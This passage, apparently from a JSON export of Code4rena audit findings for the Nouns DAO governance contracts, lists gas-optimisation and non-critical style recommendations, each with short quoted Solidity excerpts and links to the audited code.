      "id": "24471",
      "title": "[G-10]  `<array>.length` should not be looked up in every loop of a `for`-loop",
      "impact": "GAS",
      "content": "The overheads outlined below are _PER LOOP_, excluding the first loop\n* storage arrays incur a Gwarmaccess (**100 gas**)\n* memory arrays use `MLOAD` (**3 gas**)\n* calldata arrays use `CALLDATALOAD` (**3 gas**)\n\nCaching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset\n\n*There are 8 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24470",
      "title": "[G-09]  Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement",
      "impact": "GAS",
      "content": "`require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/base/ERC721Checkpointable.sol\n\n/// @audit require() on line 278\n279:          return a - b;\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L279\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24469",
      "title": "[G-08]  `internal` functions only called once can be inlined to save gas",
      "impact": "GAS",
      "content": "Not inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.\n\n*There are 7 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24468",
      "title": "[G-07]  Multiple accesses of a mapping/array should use a local variable cache",
      "impact": "GAS",
      "content": "The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` or `calldata` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory/calldata\n\n*There are 2 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24467",
      "title": "[G-06]  State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "The instances below point to the second+ access of a state variable within a function. Caching of a state variable replace each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.\n\n*There are 11 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24466",
      "title": "[G-05]  Using `storage` instead of `memory` for structs/arrays saves gas",
      "impact": "GAS",
      "content": "When fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/governance/NounsDAOLogicV2.sol\n\n952:              DynamicQuorumParamsCheckpoint memory cp = quorumParamsCheckpoints[center];\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L952\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24465",
      "title": "[G-04]  Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas",
      "impact": "GAS",
      "content": "When a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead. \n\nIf the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one\n\nNote that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved\n\n*There are 10 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24464",
      "title": "[G-03]  Structs can be packed into fewer storage slots",
      "impact": "GAS",
      "content": "Each slot saved can avoid an extra Gsset (**20000 gas**) for the first setting of the struct. Subsequent reads as well as writes have smaller gas savings\n\n*There are 3 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24463",
      "title": "[G-02]  Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate",
      "impact": "GAS",
      "content": "Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - 30 gas) and that calculation's associated stack operations.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/base/ERC721Checkpointable.sol\n\n53        mapping(address => mapping(uint32 => Checkpoint)) public checkpoints;\n54    \n55        /// @notice The number of checkpoints for each account\n56:       mapping(address => uint32) public numCheckpoints;\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L53-L56\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24462",
      "title": "[G-01]  State checks unnecessarily re-fetch `Proposal`s",
      "impact": "GAS",
      "content": "Every call to `state()` fetches the `Proposal` storage variable, which is fetched again immediately afterwards by the caller. If instead there were a version of `state()` that took in a `Proposal storage` variable, the proposal could be fetched only once, saving the gas of the mapping lookup\n\n*There are 5 instances of this issue. (For in-depth details on this and all further gas optimizations with multiple instances, please see the warden's [full report](https://github.com/code-423n4/2022-08-nounsdao-findings/issues/164).)*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24461",
      "title": "[N-12]  Typos",
      "impact": "LOW",
      "content": "\n*There are 4 instances of this issue:*\n```solidity\nFile: /contracts/governance/NounsDAOLogicV1.sol\n\n/// @audit contructor\n104:      * @notice Used to initialize the contract during delegator contructor\n\n/// @audit priviledges\n646:      * @notice Burns veto priviledges\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L104\n\n```solidity\nFile: /contracts/governance/NounsDAOLogicV2.sol\n\n/// @audit contructor\n115:      * @notice Used to initialize the contract during delegator contructor\n\n/// @audit priviledges\n848:      * @notice Burns veto priviledges\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L115\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24460",
      "title": "[N-11]  Not using the named return variables anywhere in the function is confusing",
      "impact": "LOW",
      "content": "Consider changing the variable to be an unnamed one\n\n*There are 8 instances of this issue:*\n```solidity\nFile: contracts/governance/NounsDAOLogicV1.sol\n\n/// @audit targets\n/// @audit values\n/// @audit signatures\n/// @audit calldatas\n392       function getActions(uint256 proposalId)\n393           external\n394           view\n395           returns (\n396               address[] memory targets,\n397               uint256[] memory values,\n398               string[] memory signatures,\n399:              bytes[] memory calldatas\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L392-L399\n\n```solidity\nFile: contracts/governance/NounsDAOLogicV2.sol\n\n/// @audit targets\n/// @audit values\n/// @audit signatures\n/// @audit calldatas\n403       function getActions(uint256 proposalId)\n404           external\n405           view\n406           returns (\n407               address[] memory targets,\n408               uint256[] memory values,\n409               string[] memory signatures,\n410:              bytes[] memory calldatas\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L403-L410\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24459",
      "title": "[N-10]  Event is missing `indexed` fields",
      "impact": "LOW",
      "content": "Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each `event` should use three `indexed` fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.\n\n*There are 21 instances of this issue:*\n```solidity\nFile: contracts/base/ERC721Checkpointable.sol\n\n73:       event DelegateVotesChanged(address indexed delegate, uint256 previousBalance, uint256 newBalance);\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L73\n\n```solidity\nFile: contracts/governance/NounsDAOInterfaces.sol\n\n37        event ProposalCreated(\n38            uint256 id,\n39            address proposer,\n40            address[] targets,\n41            uint256[] values,\n42            string[] signatures,\n43            bytes[] calldatas,\n44            uint256 startBlock,\n45            uint256 endBlock,\n46            string description\n47:       );\n\n50        event ProposalCreatedWithRequirements(\n51            uint256 id,\n52            address proposer,\n53            address[] targets,\n54            uint256[] values,\n55            string[] signatures,\n56            bytes[] calldatas,\n57            uint256 startBlock,\n58            uint256 endBlock,\n59            uint256 proposalThreshold,\n60            uint256 quorumVotes,\n61            string description\n62:       );\n\n70:       event VoteCast(address indexed voter, uint256 proposalId, uint8 support, uint256 votes, string reason);\n\n73:       event ProposalCanceled(uint256 id);\n\n76:       event ProposalQueued(uint256 id, uint256 eta);\n\n79:       event ProposalExecuted(uint256 id);\n\n82:       event ProposalVetoed(uint256 id);\n\n85:       event VotingDelaySet(uint256 oldVotingDelay, uint256 newVotingDelay);\n\n88:       event VotingPeriodSet(uint256 oldVotingPeriod, uint256 newVotingPeriod);\n\n91:       event NewImplementation(address oldImplementation, address newImplementation);\n\n94:       event ProposalThresholdBPSSet(uint256 oldProposalThresholdBPS, uint256 newProposalThresholdBPS);\n\n97:       event QuorumVotesBPSSet(uint256 oldQuorumVotesBPS, uint256 newQuorumVotesBPS);\n\n100:      event NewPendingAdmin(address oldPendingAdmin, address newPendingAdmin);\n\n103:      event NewAdmin(address oldAdmin, address newAdmin);\n\n106:      event NewVetoer(address oldVetoer, address newVetoer);\n\n111:      event MinQuorumVotesBPSSet(uint16 oldMinQuorumVotesBPS, uint16 newMinQuorumVotesBPS);\n\n114:      event MaxQuorumVotesBPSSet(uint16 oldMaxQuorumVotesBPS, uint16 newMaxQuorumVotesBPS);\n\n117:      event QuorumCoefficientSet(uint32 oldQuorumCoefficient, uint32 newQuorumCoefficient);\n\n120:      event RefundableVote(address indexed voter, uint256 refundAmount, bool refundSent);\n\n123:      event Withdraw(uint256 amount, bool sent);\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOInterfaces.sol#L37-L47\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24458",
      "title": "[N-09]  Non-library/interface files should use fixed compiler versions, not floating ones",
      "impact": "LOW",
      "content": "\n*There are 4 instances of this issue:*\n```solidity\nFile: contracts/governance/NounsDAOInterfaces.sol\n\n33:   pragma solidity ^0.8.6;\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOInterfaces.sol#L33\n\n```solidity\nFile: contracts/governance/NounsDAOLogicV1.sol\n\n61:   pragma solidity ^0.8.6;\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L61\n\n```solidity\nFile: contracts/governance/NounsDAOLogicV2.sol\n\n53:   pragma solidity ^0.8.6;\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L53\n\n```solidity\nFile: contracts/governance/NounsDAOProxy.sol\n\n36:   pragma solidity ^0.8.6;\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOProxy.sol#L36\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24457",
      "title": "[N-08]  Lines are too long",
      "impact": "LOW",
      "content": "Usually lines in source code are limited to [80](https://softwareengineering.stackexchange.com/questions/148677/why-is-80-characters-the-standard-limit-for-code-width) characters. Today's screens are much larger so it's reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over [164](https://github.com/aizatto/character-length) characters, the lines below should be split when they reach that length\n\n*There are 7 instances of this issue:*\n```solidity\nFile: contracts/governance/NounsDAOInterfaces.sol\n\n156:      /// @notice The basis point number of votes in support of a proposal required in order for a quorum to be reached and for a vote to succeed. *DIFFERS from GovernerBravo\n\n181:          /// @notice The number of votes in support of a proposal required in order for a quorum to be reached and for a vote to succeed at the time of proposal creation. *DIFFERS from GovernerBravo\n\n256:      /// @notice The basis point number of votes in support of a proposal required in order for a quorum to be reached and for a vote to succeed. *DIFFERS from GovernerBravo\n\n281:          /// @notice The number of votes in support of a proposal required in order for a quorum to be reached and for a vote to succeed at the time of proposal creation. *DIFFERS from GovernerBravo\n\n375:          /// @notice The minimum number of votes in support of a proposal required in order for a quorum to be reached and for a vote to succeed at the time of proposal creation. *DIFFERS from GovernerBravo\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOInterfaces.sol#L156\n\n```solidity\nFile: contracts/governance/NounsDAOLogicV1.sol\n\n507:          /// @notice: Unlike GovernerBravo, votes are considered from the block the proposal was created in order to normalize quorumVotes and proposalThreshold metrics\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L507\n\n```solidity\nFile: contracts/governance/NounsDAOLogicV2.sol\n\n599:          /// @notice: Unlike GovernerBravo, votes are considered from the block the proposal was created in order to normalize quorumVotes and proposalThreshold metrics\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L599\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24456",
      "title": "[N-07]  Constant redefined elsewhere",
      "impact": "LOW",
      "content": "Consider defining in only one contract so that values cannot become out of sync when only one location is updated. A [cheap way](https://medium.com/coinmonks/gas-cost-of-solidity-library-functions-dbe0cedd4678) to store constants in a single location is to create an `internal constant` in a `library`. If the variable is a local cache of another contract's value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don't get out of sync.\n\n*There are 11 instances of this issue:*\n```solidity\nFile: contracts/governance/NounsDAOLogicV2.sol\n\n/// @audit seen in contracts/governance/NounsDAOLogicV1.sol \n59:       string public constant name = 'Nouns DAO';\n\n/// @audit seen in contracts/governance/NounsDAOLogicV1.sol \n62:       uint256 public constant MIN_PROPOSAL_THRESHOLD_BPS = 1; // 1 basis point or 0.01%\n\n/// @audit seen in contracts/governance/NounsDAOLogicV1.sol \n65:       uint256 public constant MAX_PROPOSAL_THRESHOLD_BPS = 1_000; // 1,000 basis points or 10%\n\n/// @audit seen in contracts/governance/NounsDAOLogicV1.sol \n68:       uint256 public constant MIN_VOTING_PERIOD = 5_760; // About 24 hours\n\n/// @audit seen in contracts/governance/NounsDAOLogicV1.sol \n71:       uint256 public constant MAX_VOTING_PERIOD = 80_640; // About 2 weeks\n\n/// @audit seen in contracts/governance/NounsDAOLogicV1.sol \n74:       uint256 public constant MIN_VOTING_DELAY = 1;\n\n/// @audit seen in contracts/governance/NounsDAOLogicV1.sol \n77:       uint256 public constant MAX_VOTING_DELAY = 40_320; // About 1 week\n\n/// @audit seen in contracts/governance/NounsDAOLogicV1.sol \n89:       uint256 public constant MAX_QUORUM_VOTES_BPS = 2_000; // 2,000 basis points or 20%\n\n/// @audit seen in contracts/governance/NounsDAOLogicV1.sol \n92:       uint256 public constant proposalMaxOperations = 10; // 10 actions\n\n/// @audit seen in contracts/governance/NounsDAOLogicV1.sol \n101       bytes32 public constant DOMAIN_TYPEHASH =\n102:          keccak256('EIP712Domain(string name,uint256 chainId,address verifyingContract)');\n\n/// @audit seen in contracts/governance/NounsDAOLogicV1.sol \n105:      bytes32 public constant BALLOT_TYPEHASH = keccak256('Ballot(uint256 proposalId,uint8 support)');\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L59\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24455",
      "title": "[N-06]  Expressions for constant values such as a call to `keccak256()`, should use `immutable` rather than `constant`",
      "impact": "LOW",
      "content": "While it doesn't save any gas because the compiler knows that developers often make this mistake, it's still best to use the right tool for the task at hand. There is a difference between `constant` variables and `immutable` variables, and they should each be used in their appropriate contexts. `constants` should be used for literal values written into the code, and `immutable` variables should be used for expressions, or values calculated in, or passed into the constructor.\n\n*There are 6 instances of this issue:*\n```solidity\nFile: contracts/base/ERC721Checkpointable.sol\n\n59        bytes32 public constant DOMAIN_TYPEHASH =\n60:           keccak256('EIP712Domain(string name,uint256 chainId,address verifyingContract)');\n\n63        bytes32 public constant DELEGATION_TYPEHASH =\n64:           keccak256('Delegation(address delegatee,uint256 nonce,uint256 expiry)');\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L59-L60\n\n```solidity\nFile: contracts/governance/NounsDAOLogicV1.sol\n\n97        bytes32 public constant DOMAIN_TYPEHASH =\n98:           keccak256('EIP712Domain(string name,uint256 chainId,address verifyingContract)');\n\n101:      bytes32 public constant BALLOT_TYPEHASH = keccak256('Ballot(uint256 proposalId,uint8 support)');\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L97-L98\n\n```solidity\nFile: contracts/governance/NounsDAOLogicV2.sol\n\n101       bytes32 public constant DOMAIN_TYPEHASH =\n102:          keccak256('EIP712Domain(string name,uint256 chainId,address verifyingContract)');\n\n105:      bytes32 public constant BALLOT_TYPEHASH = keccak256('Ballot(uint256 proposalId,uint8 support)');\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L101-L102\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24454",
      "title": "[N-05]  Use a more recent version of solidity",
      "impact": "LOW",
      "content": "Use a solidity version of at least 0.8.12 to get `string.concat()` to be used instead of `abi.encodePacked(<str>,<str>)`\n\n*There are 3 instances of this issue:*\n```solidity\nFile: contracts/base/ERC721Checkpointable.sol\n\n35:   pragma solidity ^0.8.6;\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L35\n\n```solidity\nFile: contracts/governance/NounsDAOLogicV1.sol\n\n61:   pragma solidity ^0.8.6;\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L61\n\n```solidity\nFile: contracts/governance/NounsDAOLogicV2.sol\n\n53:   pragma solidity ^0.8.6;\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L53\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24453",
      "title": "[N-04]  `constant`s should be defined rather than using magic numbers",
      "impact": "LOW",
      "content": "Even [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39) can benefit from using readable constants instead of hex/numeric literals\n\n*There are 8 instances of this issue:*\n```solidity\nFile: contracts/base/ERC721Checkpointable.sol\n\n/// @audit 32\n254:          require(n < 2**32, errorMessage);\n\n/// @audit 96\n259:          require(n < 2**96, errorMessage);\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L254\n\n```solidity\nFile: contracts/governance/NounsDAOLogicV1.sol\n\n/// @audit 10000\n673:          return (number * bps) / 10000;\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L673\n\n```solidity\nFile: contracts/governance/NounsDAOLogicV2.sol\n\n/// @audit 10000\n908:          uint256 againstVotesBPS = (10000 * againstVotes) / totalSupply;\n\n/// @audit 1e6\n909:          uint256 quorumAdjustmentBPS = (params.quorumCoefficient * againstVotesBPS) / 1e6;\n\n/// @audit 10000\n1007:         return (number * bps) / 10000;\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L908\n\n```solidity\nFile: contracts/governance/NounsDAOProxy.sol\n\n/// @audit 0x20\n98:                   revert(add(returnData, 0x20), returndatasize())\n\n/// @audit 0x40\n113:              let free_mem_ptr := mload(0x40)\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOProxy.sol#L98\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24452",
      "title": "[N-03]  `2**<n> - 1` should be re-written as `type(uint<n>).max`",
      "impact": "LOW",
      "content": "Earlier versions of solidity can use `uint<n>(-1)` instead. Expressions not including the `- 1` can often be re-written to accomodate the change (e.g. by using a `>` rather than a `>=`, which will also save some gas)\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/base/ERC721Checkpointable.sol\n\n254:          require(n < 2**32, errorMessage);\n\n259:          require(n < 2**96, errorMessage);\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L254\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24451",
      "title": "[N-02]  Non-assembly method available",
      "impact": "LOW",
      "content": "`assembly{ id := chainid() }` => `uint256 id = block.chainid`, `assembly { size := extcodesize() }` => `uint256 size = address().code.length`\nThere are some automated tools that will flag a project as having higher complexity if there is inline-assembly, so it's best to avoid using it where it's not necessary\n\n*There are 3 instances of this issue:*\n```solidity\nFile: contracts/base/ERC721Checkpointable.sol\n\n285:              chainId := chainid()\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L285\n\n```solidity\nFile: contracts/governance/NounsDAOLogicV1.sol\n\n679:              chainId := chainid()\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L679\n\n```solidity\nFile: contracts/governance/NounsDAOLogicV2.sol\n\n1013:             chainId := chainid()\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L1013\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24450",
      "title": "[N-01]  `public` functions not called by the contract should be declared `external` instead",
      "impact": "LOW",
      "content": "Contracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\n\n*There are 8 instances of this issue:*\n```solidity\nFile: contracts/governance/NounsDAOLogicV1.sol\n\n174       function propose(\n175           address[] memory targets,\n176           uint256[] memory values,\n177           string[] memory signatures,\n178           bytes[] memory calldatas,\n179           string memory description\n180:      ) public returns (uint256) {\n\n649       function _burnVetoPower() public {\n650           // Check caller is pendingAdmin and pendingAdmin ≠ address(0)\n651:          require(msg.sender == vetoer, 'NounsDAO::_burnVetoPower: vetoer only');\n\n660:      function proposalThreshold() public view returns (uint256) {\n\n668:      function quorumVotes() public view returns (uint256) {\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L174-L180\n\n```solidity\nFile: 